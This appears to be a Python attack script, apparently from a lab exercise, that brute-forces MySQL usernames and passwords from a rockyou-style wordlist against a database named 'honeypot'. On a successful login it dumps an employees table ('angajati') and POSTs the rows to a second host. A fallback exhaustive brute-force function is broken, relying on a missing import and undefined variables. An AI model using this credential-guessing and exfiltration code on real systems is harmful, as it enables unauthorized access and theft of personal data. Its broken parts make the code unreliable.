import time
import json
import mysql.connector
import requests
from decimal import Decimal

file_path = "./rocky.txt"
time_start = time.time()  # start clock
doc_len = len(open(file_path, "r", errors='replace').readlines())
lines = []

with open(file_path, "r", errors='replace') as f:
    for _ in range(doc_len):
        lines.append(f.readline())

num_attempts = 0
ok=0
for i in range(doc_len):
    potential_username = lines[i].rstrip('\n')
    print("\nTrying to connect with user: ",potential_username)
    for i in range(doc_len):
        num_attempts += 1
        print(num_attempts)
        potential_password = lines[i].rstrip('\n')
        try:
            conn = mysql.connector.connect(
                host="192.168.179.129",
                user=potential_username,
                password=potential_password,
                database="honeypot"
            )

            if conn.cursor():
                mycursor = conn.cursor()
                print("Conexiune reusita")
                ok=1
                mycursor.execute("Select * from angajati")
                results = mycursor.fetchall()
                json_data = json.dumps(results, default=str)
                print(results)
                r = requests.post('http://192.168.179.132:5000/data', json=json_data)
                for row in results:
                    print(row)
                conn.close()
                break
        except mysql.connector.errors.ProgrammingError as e:
            print(f"Failed to connect with password: {potential_password}")
            continue 

        except Exception as e:
            print(f"An error occurred: {str(e)}")
            continue






def bruteforce():
    for m in itertools.product(data_list,repeat=5):
        potential_user = ''.join(m)
        for t in itertools.product(data_list, repeat=5):
            potential_pass = ''.join(t)
            try:
                conn = mysql.connector.connect(
                    host="192.168.179.129",
                    user=potential_user,
                    password=potential_pass,
                    database="honeypot"
                )

                if conn.cursor():
                    mycursor = conn.cursor()
                    print("Conexiune reusita")
                    mycursor.execute("Select * from angajati")
                    results = mycursor.fetchall()
                    for row in results:
                        print(row)
                    conn.close()
                    break
            except mysql.connector.errors.ProgrammingError as e:
                print(f"Failed to connect with password: {potential_password}")
                continue 

            except Exception as e:
                print(f"An error occurred: {str(e)}")
                continue



if ok==0:
    bruteforce()
time_stop = time.time()  # end clock
time_check = time_stop - time_start

if time_check > 60:  # convert time to minutes and print
    tt_complete = str((time_stop - time_start) / 60)
    print("time to complete: " + tt_complete + " minutes")
elif time_check > 3600:  # convert time to hours and print
    tt_complete = str((time_stop - time_start) / 3600)
    print("time to complete: " + tt_complete + " hours")
else:  # print time in seconds
    tt_complete = str(time_stop - time_start)
    print("time to complete: " + tt_complete + " seconds")

